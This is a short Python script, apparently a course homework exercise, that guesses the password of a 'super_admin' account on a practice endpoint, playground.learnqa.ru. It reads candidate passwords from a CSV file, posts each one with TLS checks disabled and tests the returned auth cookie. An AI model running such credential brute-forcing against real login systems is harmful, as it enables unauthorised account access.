import requests
import csv

# Ex9*: Подбор пароля
requests.packages.urllib3.disable_warnings()
filename = 'unique_pass.csv'
page = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
page2 = "https://playground.learnqa.ru/api/check_auth_cookie"
load = '"login": "super_admin","password": '

input_list=[]
with open(filename, 'r', newline='') as csvfile:
    data = csv.reader(csvfile, delimiter=' ')
    for n in data:
        # print(', '.join(n))
        input_list.append(', '.join(n))
# print(input_list[3])

l = len(input_list)
for i in range(l):
    login = 'super_admin'
    # response = requests.post(page, data={"login": "super_admin", "password": f'{input_list[i]}'}, verify=False)
    response = requests.post(page, data={"login": f'{login}',"password": f'{input_list[i]}'}, verify=False)
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post(page2, cookies=cookies, verify=False)
    if response2.text == 'You are authorized':
        print(input_list[i])


